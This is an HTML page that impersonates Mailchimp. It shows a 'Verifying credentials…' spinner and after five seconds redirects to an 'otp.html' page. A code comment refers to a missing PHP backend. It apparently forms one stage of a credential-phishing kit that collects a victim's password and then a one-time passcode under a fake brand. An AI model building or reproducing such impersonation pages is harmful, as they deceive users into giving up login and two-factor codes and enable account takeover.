<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Please wait… | Mailchimp</title>
<style>
body{margin:0;background:#F9FAFB}
.wait-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.92);backdrop-filter:blur(6px);display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:9999}
.spinner{width:48px;height:48px;border:5px solid rgba(255,224,27,0.3);border-top:5px solid #ffe01b;border-radius:50%;animation:spin 0.8s linear infinite}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.wait-text{margin-top:24px;font-size:16px;font-weight:500;color:#241c15}
.small-text{margin-top:8px;font-size:13px;color:#595959}
</style>
</head>
<body>
<div class="wait-overlay">
  <div class="spinner"></div>
  <p class="wait-text">Verifying credentials…</p>
  <p class="small-text">This will only take a moment</p>
</div>
<script>
// Since there's no PHP backend polling, we auto-redirect to OTP after 5 seconds
setTimeout(function() {
    window.location.href = "otp.html";
}, 5000);
</script>
</body>
</html>
